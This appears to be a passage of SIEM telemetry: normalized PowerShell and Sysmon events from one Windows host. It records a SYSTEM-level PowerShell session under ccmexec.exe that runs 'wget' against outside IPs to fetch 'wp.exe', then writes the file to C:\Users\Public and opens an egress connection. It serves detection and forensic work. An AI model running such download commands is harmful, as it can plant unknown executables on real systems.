    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:58:04.2806539Z\"},\"EventRecordID\":\"248379\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0002-4c4f-6408953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"ls\"},{\"Name\":\"ScriptBlockId\",\"text\":\"00a16677-5ede-423f-b453-5cd02db87b01\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "00a16677-5ede-423f-b453-5cd02db87b01",
      "object.process.cmdline": "ls",
      "object.process.id": "7564",
      "object.value": "ls",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:58:04.2800000Z",
      "uuid": "dc4c2bb1-ad90-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216154240141,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "dc4c2bb1-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:58:04.2800000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:58:32.6588750Z\"},\"EventRecordID\":\"248385\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0002-6a4f-6408953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"wget http://10.126.248.138/wp.exe -o wp.exe -usebasicparsing\"},{\"Name\":\"ScriptBlockId\",\"text\":\"e0753eae-1432-4af1-b254-2d6538e01187\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "e0753eae-1432-4af1-b254-2d6538e01187",
      "object.process.cmdline": "wget http://10.126.248.138/wp.exe -o wp.exe -usebasicparsing",
      "object.process.id": "7564",
      "object.value": "wget http://10.126.248.138/wp.exe -o wp.exe -usebasicparsing",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:58:32.6580000Z",
      "uuid": "dc4c2bb6-ad90-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216154240145,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "dc4c2bb6-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:58:32.6580000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:58:34.8050935Z\"},\"EventRecordID\":\"2437466\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:58:34.797\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\diasymreader.dll\"},{\"Name\":\"FileVersion\",\"text\":\"14.8.9241.0 built by: NET481REL1LAST_C\"},{\"Name\":\"Description\",\"text\":\"Dia based SymReader\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae .NET Framework\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"diasymreader.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=055073ABE773DD5FD6CAF9D341CC01AA,SHA256=B25B004D1C5D0B69509B185FEE070ED2FDBFA4D8AD5975AAF165A3F54118FB0D,IMPHASH=47857E2DAE4F31E9E6549F036DB186BA\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\diasymreader.dll",
      "object.process.hash": "IMPHASH:47857E2DAE4F31E9E6549F036DB186BA MD5:055073ABE773DD5FD6CAF9D341CC01AA SHA256:B25B004D1C5D0B69509B185FEE070ED2FDBFA4D8AD5975AAF165A3F54118FB0D",
      "object.process.hash.imphash": "47857E2DAE4F31E9E6549F036DB186BA",
      "object.process.hash.md5": "055073ABE773DD5FD6CAF9D341CC01AA",
      "object.process.hash.sha256": "B25B004D1C5D0B69509B185FEE070ED2FDBFA4D8AD5975AAF165A3F54118FB0D",
      "object.process.meta": "Description:Dia based SymReader | Product:Microsoft\u00ae .NET Framework | Company:Microsoft Corporation",
      "object.process.name": "diasymreader.dll",
      "object.process.original_name": "diasymreader.dll",
      "object.process.path": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "14.8.9241.0 built by: NET481REL1LAST_C",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:58:34.8050000Z",
      "uuid": "e2277fcb-ad90-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module diasymreader.dll on host wperry.dev.it.stf",
      "_checkpoint": 216154592453,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "e2277fcb-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:58:34.8050000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:59:01.2894598Z\"},\"EventRecordID\":\"248387\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0003-86b7-6208953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"wget http://3.5.140.10/wp.exe -o wp.exe -usebasicparsing\"},{\"Name\":\"ScriptBlockId\",\"text\":\"d7c960cc-7799-4e90-a6be-72dc16cf0ab1\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "d7c960cc-7799-4e90-a6be-72dc16cf0ab1",
      "object.process.cmdline": "wget http://3.5.140.10/wp.exe -o wp.exe -usebasicparsing",
      "object.process.id": "7564",
      "object.value": "wget http://3.5.140.10/wp.exe -o wp.exe -usebasicparsing",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:59:01.2890000Z",
      "uuid": "fec601de-ad90-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216156208065,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "fec601de-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:59:01.2890000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "create",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"11\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"11\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:59:01.5935934Z\"},\"EventRecordID\":\"2437479\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:59:01.586\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetFilename\",\"text\":\"C:\\\\Users\\\\Public\\\\wp.exe\"},{\"Name\":\"CreationUtcTime\",\"text\":\"2024-11-28 13:59:01.586\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "File System Object",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "datafield18": "powershell.exe (7564) [999] \u2190 powershell.exe (7280) [999] \u2190 ccmexec.exe (4660) [999]",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_11_File_create",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "11",
      "normalized": true,
      "object": "file_object",
      "object.fullpath": "c:\\users\\public\\wp.exe",
      "object.name": "wp.exe",
      "object.path": "c:\\users\\public\\",
      "object.property": "creation time",
      "object.value": "2024-11-28T13:59:01.5860000Z",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.chain": "powershell.exe \u2190 powershell.exe \u2190 ccmexec.exe",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:59:01.5930000Z",
      "uuid": "f5122e68-ad90-11ef-b052-005056b7517e",
      "text": "The process powershell.exe created the file wp.exe on host wperry.dev.it.stf",
      "_checkpoint": 216155616959,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "f5122e68-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:59:01.5930000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "detect",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"3\",\"Version\":\"5\",\"Level\":\"4\",\"Task\":\"3\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:59:04.0399505Z\"},\"EventRecordID\":\"2437480\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"4980\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:58:47.310\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"},{\"Name\":\"Protocol\",\"text\":\"tcp\"},{\"Name\":\"Initiated\",\"text\":\"true\"},{\"Name\":\"SourceIsIpv6\",\"text\":\"false\"},{\"Name\":\"SourceIp\",\"text\":\"10.156.92.66\"},{\"Name\":\"SourceHostname\",\"text\":\"wperry.dev.it.stf\"},{\"Name\":\"SourcePort\",\"text\":\"61792\"},{\"Name\":\"SourcePortName\",\"text\":\"-\"},{\"Name\":\"DestinationIsIpv6\",\"text\":\"false\"},{\"Name\":\"DestinationIp\",\"text\":\"3.5.140.10\"},{\"Name\":\"DestinationHostname\",\"text\":\"-\"},{\"Name\":\"DestinationPort\",\"text\":\"80\"},{\"Name\":\"DestinationPortName\",\"text\":\"http\"}]}}}",
      "category.generic": "Connection",
      "category.high": "Network Interaction Management",
      "category.low": "State",
      "direction": "egress",
      "dst.host": "3.5.140.10",
      "dst.ip": "3.5.140.10",
      "dst.port": 80,
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.ip": "10.156.92.66",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_3_Network_connection",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "3",
      "normalized": true,
      "object": "connection",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "object.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "object.process.id": "7564",
      "object.process.name": "powershell.exe",
      "object.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "protocol": "tcp",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "src.fqdn": "wperry.dev.it.stf",
      "src.host": "wperry.dev.it.stf",
      "src.hostname": "wperry",
      "src.ip": "10.156.92.66",
      "src.port": 61792,
      "status": "success",
      "subject": "rule",
      "subject.name": "-",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:59:04.0390000Z",
      "uuid": "f5122e69-ad90-11ef-b052-005056b7517e",
      "text": "A tcp connection from host wperry.dev.it.stf to host 3.5.140.10 is opened on host wperry.dev.it.stf",
      "_checkpoint": 216155616960,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "f5122e69-ad90-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:59:04.0390000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
